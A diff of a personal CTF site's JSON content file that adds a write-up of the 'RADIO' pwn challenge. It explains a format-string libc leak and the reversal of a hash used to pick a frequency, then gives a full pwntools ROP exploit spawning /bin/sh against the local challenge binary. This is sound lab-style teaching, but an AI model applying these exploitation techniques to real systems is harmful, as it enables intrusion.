@@ -1,52 +1,46 @@
 {
  "home": {
   "type": "page",
-  "title": "whoami",
-  "content": "<h1><i class=\"fa-solid fa-terminal\"></i> <span class=\"tw\">0xb00b4@terminal:~$ whoami</span></h1><div class=\"fade\"><p>Cybersecurity student &amp; CTF player based in Tunisia.</p><p>Focusing on binary exploitation, reverse engineering, and low-level system dynamics.</p><div id=\"stats\"></div><h3><i class=\"fa-solid fa-clock-rotate-left\"></i> latest_writeups</h3><ul class=\"file-list\" id=\"recent\"></ul><h2><i class=\"fa-solid fa-shield-virus\"></i> $ cat skills.txt</h2><ul style=\"list-style:none;padding:0\"><li><i class=\"fa-solid fa-angle-right\" style=\"color:var(--accent)\"></i> <strong>Categories:</strong> Pwn, Reverse Engineering, Forensics, OSINT</li><li><i class=\"fa-solid fa-angle-right\" style=\"color:var(--accent)\"></i> <strong>Languages:</strong> C, Python, x86-64 Assembly, Java</li><li><i class=\"fa-solid fa-angle-right\" style=\"color:var(--accent)\"></i> <strong>Tools:</strong> GDB, Ghidra, Wireshark, Docker, Linux</li></ul><h3><i class=\"fa-solid fa-chart-simple\"></i> skill_level</h3><div>Pwn <span class=\"meta\">85%</span><div class=\"bar\"><i style=\"--w:85%\"></i></div>Reverse Engineering <span class=\"meta\">75%</span><div class=\"bar\"><i style=\"--w:75%\"></i></div>Forensics <span class=\"meta\">65%</span><div class=\"bar\"><i style=\"--w:65%\"></i></div>OSINT <span class=\"meta\">60%</span><div class=\"bar\"><i style=\"--w:60%\"></i></div></div><p class=\"meta\">tip: try <b style=\"color:var(--yellow)\">help</b>, <b style=\"color:var(--yellow)\">grep pwn</b>, <b style=\"color:var(--yellow)\">neofetch</b> below ↓</p></div>"
+  "title": "./0xb00b4_",
+  "body": "Networking student at INSAT & CTF player based in Tunisia.\nBinary exploitation, reverse engineering and low-level systems.\n\n::btn GitHub | https://github.com/Hajbooba\n::btn CTFtime | https://ctftime.org/\n::btn Discord | https://discord.com/users/877314305207455805\n\n## skills\n::bar Pwn 60\n::bar Reverse Engineering 50\n::bar Forensics 40\n::bar OSINT 40",
+  "imgs": {}
  },
  "about": {
   "type": "page",
   "title": "about",
-  "body": "Welcome to my dark-mode writeup database & personal CTF archive.\n\nBrowse with the menu above, or use the prompt below — try `help`.\n\n## Contact\n- GitHub: add your link here\n- Discord: https://discord.com/users/877314305207455805",
+  "body": "Welcome to my dark-mode writeup database & personal CTF archive.\n\nBrowse with the menu above, or use the prompt below — try `help`.\n\n## Contact\n- GitHub: https://github.com/Hajbooba\n- Discord: https://discord.com/users/877314305207455805",
   "imgs": {}
  },
  "writeups": {
   "type": "dir",
   "title": "CTF Archives",
   "items": {
-   "picoctf": {
+   "securinets": {
     "type": "dir",
-    "title": "PicoCTF",
+    "title": "Friendly ctf",
     "items": {
-     "pwn": {
-      "type": "dir",
-      "title": "Binary Exploitation",
-      "items": {
-       "buffer-overflow-0": {
-        "type": "file",
-        "title": "buffer-overflow-0.md",
-        "date": "2026-09-29",
-        "category": "Pwn",
-        "body": "A classic stack-based buffer overflow. The target reads user input into a fixed buffer without length checks.\n\n## Exploit\n```python\nfrom pwn import *\n\np = remote('saturn.picoctf.net', 50000)\npayload = b\"A\" * 100\np.sendline(payload)\np.interactive()\n```\n\nFlag: picoCTF{example_flag_here}\n\nLog in, open this file and click **edit** to place screenshots anywhere in the text.",
-        "pts": "100 pts"
-       },
-       "buffer-overflow-1": {
-        "type": "file",
-        "title": "buffer-overflow-1.md",
-        "date": "2026-09-28",
-        "category": "Pwn",
-        "pts": "200 pts",
-        "body": "Placeholder writeup. Edit or delete me."
-       },
-       "crackme-0": {
-        "type": "file",
-        "title": "crackme-0.md",
-        "date": "2026-09-27",
-        "category": "Rev",
-        "pts": "150 pts",
-        "body": "Placeholder writeup. Edit or delete me."
-       }
-      }
+     "radio": {
+      "type": "file",
+      "title": "RADIO.md",
+      "date": "2026-09-30",
+      "category": "pwn",
+      "pts": "500",
+      "body": "The binary presents a radio broadcast interface that takes a frequency route string, echoes it back, and executes a corresponding handler function before prompting for a clearance code.\n\nso firstly we are provided with an main executable we are trying to get the flag out of it, let's check the binary security first :\n\n![image](img:imuoe2he4h90)\n\nas we can see , the file has full relro, pie , nx and canary . so we're not facing a classic challenge. \n\nWhen we first execute the file , it asks for a frequency, and if we provide a valid input, we are asked for another input. \n\nI opened the file in ghidra to get an idea about the functions used and this is what i found : \n\n\n![image](img:imuprpgps1ip)\n\nInspecting main(), the input string passes through valid_route() before being printed via printf() .\nvalid_route() enforces a strict character whitelist: digits, whitespace, %, $, and p. This explicitly allows positional format specifiers like %41$p. Looking at the argument stack for printf(), argument #41 holds the address of puts, giving a direct libc leak.\nRight after printf(), main() parses the same buffer with strtol(), What does strtol()do ?\nstrtol() parses digits until the first non-numeric byte (a space). Passing a string structured as N %41$p supplies an integer N for frequency selection while simultaneously triggering the format string leak. \nThe integer N returned by strtol() indexes an array of function pointers: \n(**(code **)(frequency_table + lStack_10 * 8))();\nTo figure out which frequency N routes to the target handler (line_three), we inspect how issue_clearance() generates its validation value:\n\n\n![image](img:imuprteepdcw)\n\nIf route_tag(N) equals 0x30db734f, issue_clearance() sets a hardcoded canary with the value (\"jiggly!!\" in little-endian). Otherwise, it produces a dynamic hash that changes every run.\n\nSo to get the correct frequency , we gotta reverse the route_tag(N) function: \n\n![image](img:imuprwgm74tr)\n\nTo reverse this we just need a simple python script that will give us the correct frequency \n\n\n```python\ndef unxorshift_right(val: int, shift: int) -> int:\n    res = val\n    curr = val >> shift\n    while curr > 0:\n        res ^= curr\n        curr >>= shift\n    return res & 0xFFFFFFFF\n\ndef mod_inverse_32(a: int) -> int:\n    return pow(a, -1, 1 << 32)\n\ndef invert_route_tag(target: int) -> int:\n    c1 = 0x7FEB352D\n    c2 = (-0x7B935975) & 0xFFFFFFFF\n    \n    inv_c1 = mod_inverse_32(c1)\n    inv_c2 = mod_inverse_32(c2)\n    \n    # Step 5 inverse\n    x4 = unxorshift_right(target, 16)\n    # Step 4 inverse\n    x3 = (x4 * inv_c2) & 0xFFFFFFFF\n    # Step 3 inverse\n    x2 = unxorshift_right(x3, 15)\n    # Step 2 inverse\n    x1 = (x2 * inv_c1) & 0xFFFFFFFF\n    # Step 1 inverse\n    x = unxorshift_right(x1, 16)\n    \n    return x\n\n# Solve for the clearance trigger value 0x30db734f\ntarget_tag = 0x30DB734F\nparam_1 = invert_route_tag(target_tag)\nprint(f\"Target Tag : {hex(target_tag)}\")\nprint(f\"Required param_1 : {hex(param_1)} ({param_1})\")\n\n```\nRunning this script we get this :\n![image](img:imuprzhdrp15)\nNow we got the correct frequency let's continue our exploit .\nI run the file with gdb, and i tested the first input **`20480%41$p`**  and the first check passed, when im asked for the second input i send random A's and i noticed this \n\n![image](img:imupshlm5oi1)\n\nas you can see our input \"0x4141414141414141\" is getting coompared with \"0x2121796c6767696a\" which is the hardcoded canary. seeing where is our input in the stack \n![image](img:imupsl20zwd2)\nand with simple math we new that the canary is after 16 bytes from the start of our payload. \nSo the plan is clear now we will send 16 bytes padding , canary , other 16 bytes to reach return adress then our rop chain. and here is the solver i ended up with: \n```python\n#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.binary = ELF(\"./main\", checksec=False)\ncontext.log_level = \"error\"\nlibc = ELF(\"./libc.so.6\", checksec=False)\n\n\nfrequency = 20480\n\ncanary = b\"jiggly!!\"\nroute = f\"{frequency} %41$p\".encode()\n\np = process(\"./main\") \n\np.sendlineafter(b\"> \", route)\np.recvuntil(b\"ENCRYPTED ROUTE ECHO:\\n\")\nputs = int(p.recvline().split()[-1], 16)\nlibc.address = puts - libc.sym[\"puts\"]\n\nrop = ROP(libc)\npop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\nret = rop.find_gadget([\"ret\"]).address\nbin_sh = next(libc.search(b\"/bin/sh\\0\"))\n\npayload = flat(\n    b\"A\" * 16,\n    canary,\n    b\"B\" * 16,\n    pop_rdi,\n    bin_sh,\n    ret,\n    libc.sym[\"system\"],\n)\n\np.sendlineafter(b\"> \", payload)\nsleep(0.2)\np.interactive()\n\n```\n\n![image](img:imupspqaeusf)\n\nBINGO :) \n\n\n\n\n",
+      "imgs": {
+       "imuoe2he4h90": "images/f9a605c170bb2a84.jpg",
+       "imuprpgps1ip": "images/b24f9302b735ed53.jpg",
+       "imuprteepdcw": "images/7b8219fe0152e61c.jpg",
+       "imuprwgm74tr": "images/895b7972547a7ec5.jpg",
+       "imuprzhdrp15": "images/b112ae016cad8b2e.jpg",
+       "imupshlm5oi1": "images/4dec52789f4931ee.jpg",
+       "imupsl20zwd2": "images/f82e1bda8d650715.jpg",
+       "imupspqaeusf": "images/f95558ef61745167.jpg"
+      },
+      "tags": [
+       "ROP",
+       "Format string"
+      ],
+      "role": "player"
      }
     }
    }
@@ -55,7 +49,8 @@
  "projects": {
   "type": "cards",
   "title": "Projects",
-  "items": {}
+  "items": {},
+  "kind": "project"
  },
  "achievements": {
   "type": "cards",
@@ -68,8 +63,16 @@
     "category": "CTF",
     "link": "",
     "body": "RANK 1 + solving 90% of pwn challs.",
-    "imgs": {}
+    "imgs": {},
+    "rank": "TOP 1"
    }
-  }
+  },
+  "kind": "rank"
+ },
+ "experience": {
+  "type": "cards",
+  "kind": "exp",
+  "title": "Experience",
+  "items": {}
  }
 }
